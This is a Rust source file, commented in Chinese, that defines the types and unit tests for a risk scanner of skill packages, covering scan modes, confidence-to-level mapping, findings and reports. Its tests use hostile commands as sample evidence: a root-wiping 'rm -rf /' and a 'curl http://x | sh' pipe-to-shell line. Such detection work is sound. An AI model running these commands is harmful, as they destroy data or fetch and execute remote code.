use serde::{Deserialize, Serialize};

/// 风险扫描模式
/// - off: 关闭扫描
/// - basic: 仅规则引擎（本地静态分析）
/// - deep: 规则 + LLM 二审（需配置 LLM）
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Hash, Default)]
#[serde(rename_all = "lowercase")]
pub enum RiskScanMode {
    #[default]
    Off,
    Basic,
    Deep,
}

impl RiskScanMode {
    pub fn is_off(&self) -> bool {
        matches!(self, Self::Off)
    }
    pub fn is_deep(&self) -> bool {
        matches!(self, Self::Deep)
    }
}

/// 风险等级，由置信度映射得到
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "lowercase")]
pub enum RiskLevel {
    Safe,
    Low,
    Medium,
    High,
    Critical,
}

impl RiskLevel {
    /// 置信度 → 等级
    pub fn from_confidence(confidence: f32) -> Self {
        if confidence >= 0.95 {
            Self::Critical
        } else if confidence >= 0.80 {
            Self::High
        } else if confidence >= 0.60 {
            Self::Medium
        } else if confidence >= 0.40 {
            Self::Low
        } else {
            Self::Safe
        }
    }

    /// 取两者中较高的等级
    pub fn max(self, other: Self) -> Self {
        if self >= other {
            self
        } else {
            other
        }
    }
}

/// 风险类别（对应四类风险）
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum RiskCategory {
    Destructive,
    Network,
    Privilege,
    Payload,
}

/// 命中位置
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RiskLocation {
    /// 相对于 skill 目录的文件路径，POSIX 风格
    pub file: String,
    /// 1-based 起始行号
    pub line: u32,
    /// 命中代码块的语言（bash/python/...），用于降权判断
    pub lang: Option<String>,
    /// 是否处于 Markdown 代码示例块内
    pub in_code_example: bool,
    /// 是否处于注释行（# 开头）
    pub in_comment: bool,
    /// 文件是否在 docs/ 目录下
    pub in_docs_dir: bool,
}

/// 单条风险发现
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RiskFinding {
    /// 规则 ID，如 "destructive.rm_rf_root"
    pub rule_id: String,
    pub level: RiskLevel,
    pub category: RiskCategory,
    /// 规则匹配后的最终置信度（经过上下文降权）
    pub confidence: f32,
    /// 人类可读说明
    pub message: String,
    /// 命中的证据片段
    pub evidence: String,
    pub location: RiskLocation,
    /// 是否由 LLM 二审产出（false = 规则引擎产出）
    pub from_llm: bool,
}

/// 单个 skill 的风险报告
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct SkillRiskReport {
    pub instance_id: String,
    /// 最高风险等级
    pub level: RiskLevel,
    pub findings: Vec<RiskFinding>,
    /// 是否经过了 LLM 二审
    pub llm_reviewed: bool,
    /// 扫描时间戳（秒）
    pub scanned_at: i64,
    /// 扫描器版本，用于缓存失效
    pub scanner_version: String,
    /// 触发扫描时的模式
    pub mode: RiskScanMode,
}

impl SkillRiskReport {
    /// 空报告（无 finding）
    pub fn safe(instance_id: &str, scanner_version: &str, mode: RiskScanMode) -> Self {
        Self {
            instance_id: instance_id.to_string(),
            level: RiskLevel::Safe,
            findings: Vec::new(),
            llm_reviewed: false,
            scanned_at: now_ts(),
            scanner_version: scanner_version.to_string(),
            mode,
        }
    }

    /// 追加一条 finding，并同步更新最高等级
    pub fn push_finding(&mut self, finding: RiskFinding) {
        self.level = self.level.max(finding.level);
        self.findings.push(finding);
    }

    /// 合并 LLM 产出的 findings（不覆盖规则产出的等级计算）
    pub fn merge_llm_findings(&mut self, mut llm_findings: Vec<RiskFinding>) {
        for f in &mut llm_findings {
            f.from_llm = true;
        }
        for f in &llm_findings {
            self.level = self.level.max(f.level);
        }
        self.findings.extend(llm_findings);
        self.llm_reviewed = true;
    }
}

/// 缓存 key：path + mtime + scanner_version + mode
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub struct RiskCacheKey {
    pub instance_id: String,
    pub path: String,
    pub mtime: i64,
    pub scanner_version: String,
    pub mode: RiskScanMode,
}

fn now_ts() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn risk_level_from_confidence_thresholds() {
        assert_eq!(RiskLevel::from_confidence(0.99), RiskLevel::Critical);
        assert_eq!(RiskLevel::from_confidence(0.95), RiskLevel::Critical);
        assert_eq!(RiskLevel::from_confidence(0.94), RiskLevel::High);
        assert_eq!(RiskLevel::from_confidence(0.80), RiskLevel::High);
        assert_eq!(RiskLevel::from_confidence(0.79), RiskLevel::Medium);
        assert_eq!(RiskLevel::from_confidence(0.60), RiskLevel::Medium);
        assert_eq!(RiskLevel::from_confidence(0.59), RiskLevel::Low);
        assert_eq!(RiskLevel::from_confidence(0.40), RiskLevel::Low);
        assert_eq!(RiskLevel::from_confidence(0.39), RiskLevel::Safe);
        assert_eq!(RiskLevel::from_confidence(0.0), RiskLevel::Safe);
    }

    #[test]
    fn risk_level_max_picks_higher() {
        assert_eq!(RiskLevel::Low.max(RiskLevel::High), RiskLevel::High);
        assert_eq!(RiskLevel::Critical.max(RiskLevel::Low), RiskLevel::Critical);
        assert_eq!(RiskLevel::Medium.max(RiskLevel::Medium), RiskLevel::Medium);
    }

    #[test]
    fn risk_scan_mode_flags() {
        assert!(RiskScanMode::Off.is_off());
        assert!(!RiskScanMode::Off.is_deep());

        assert!(!RiskScanMode::Basic.is_off());
        assert!(!RiskScanMode::Basic.is_deep());

        assert!(RiskScanMode::Deep.is_deep());
        assert!(!RiskScanMode::Deep.is_off());
    }

    #[test]
    fn report_starts_safe_and_updates_on_push() {
        let mut report = SkillRiskReport::safe("global:foo", "v1", RiskScanMode::Basic);
        assert_eq!(report.level, RiskLevel::Safe);
        assert!(report.findings.is_empty());

        report.push_finding(RiskFinding {
            rule_id: "destructive.rm_rf_root".into(),
            level: RiskLevel::Critical,
            category: RiskCategory::Destructive,
            confidence: 0.98,
            message: "rm -rf /".into(),
            evidence: "rm -rf /".into(),
            location: RiskLocation {
                file: "SKILL.md".into(),
                line: 1,
                lang: Some("bash".into()),
                in_code_example: false,
                in_comment: false,
                in_docs_dir: false,
            },
            from_llm: false,
        });
        assert_eq!(report.level, RiskLevel::Critical);
        assert_eq!(report.findings.len(), 1);
    }

    #[test]
    fn report_merge_llm_findings_sets_flag_and_updates_level() {
        let mut report = SkillRiskReport::safe("global:foo", "v1", RiskScanMode::Deep);
        let llm_findings = vec![RiskFinding {
            rule_id: "llm.suspicious_intent".into(),
            level: RiskLevel::High,
            category: RiskCategory::Payload,
            confidence: 0.85,
            message: "LLM 检测到可疑意图".into(),
            evidence: "delete database".into(),
            location: RiskLocation {
                file: "SKILL.md".into(),
                line: 5,
                lang: None,
                in_code_example: false,
                in_comment: false,
                in_docs_dir: false,
            },
            from_llm: false,
        }];
        report.merge_llm_findings(llm_findings);
        assert!(report.llm_reviewed);
        assert_eq!(report.level, RiskLevel::High);
        assert!(report.findings[0].from_llm);
    }

    #[test]
    fn report_serializes_and_round_trips() {
        let mut report = SkillRiskReport::safe("global:foo", "v1", RiskScanMode::Deep);
        report.push_finding(RiskFinding {
            rule_id: "network.pipe_to_shell".into(),
            level: RiskLevel::Critical,
            category: RiskCategory::Network,
            confidence: 0.97,
            message: "curl|sh".into(),
            evidence: "curl http://x | sh".into(),
            location: RiskLocation {
                file: "scripts/install.sh".into(),
                line: 12,
                lang: Some("bash".into()),
                in_code_example: false,
                in_comment: false,
                in_docs_dir: false,
            },
            from_llm: false,
        });
        let json = serde_json::to_string(&report).expect("serialize");
        let restored: SkillRiskReport = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(restored, report);
    }
}
